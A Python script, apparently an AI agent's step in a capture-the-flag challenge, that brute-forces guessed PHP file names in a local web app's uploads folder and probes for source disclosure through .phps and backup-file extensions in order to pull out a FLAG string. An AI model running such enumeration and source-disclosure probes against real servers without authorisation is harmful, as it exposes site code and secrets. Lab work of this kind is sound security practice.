import requests

base_url = "http://127.0.0.1:32891"

print("[+] Let me try a different approach - maybe there's a file that DOES read the flag...")
print("[+] Continuing brute force with more specific names...")

flag_reader_names = [
    "read.php", "readflag.php", "flag_content.php", "flagcontent.php",
    "show_flag.php", "showflag.php", "get_flag.php", "print_flag.php",
    "printflag.php", "display_flag.php", "displayflag.php",
    "flag.txt.php", "flag_txt.php"
]

for filename in flag_reader_names:
    resp = requests.get(f"{base_url}/posts/uploads/{filename}")
    
    if resp.status_code == 200 and len(resp.text) > 0:
        print(f"\n[+] FOUND: {filename}")
        print(f"Content: {resp.text}")
        
        if "FLAG{" in resp.text:
            print(f"\n[!!!] FLAG FOUND in {filename}!")
            
            # Extract flag
            import re
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            for flag in flags:
                print(f"\n[!!!] FINAL FLAG: {flag}")
            break

# If still not found, maybe I need to check if getflag.php source reveals something
print("\n[+] Let me try to read getflag.php source via different method...")

# Try accessing with .phps extension (sometimes exposes source)
resp = requests.get(f"{base_url}/posts/uploads/getflag.phps")
if resp.status_code == 200:
    print("getflag.phps content:")
    print(resp.text)

# Try backup files
for ext in ['.bak', '.backup', '.old', '.txt', '~']:
    resp = requests.get(f"{base_url}/posts/uploads/getflag.php{ext}")
    if resp.status_code == 200 and len(resp.text) > 0:
        print(f"\nFound getflag.php{ext}:")
        print(resp.text[:500])

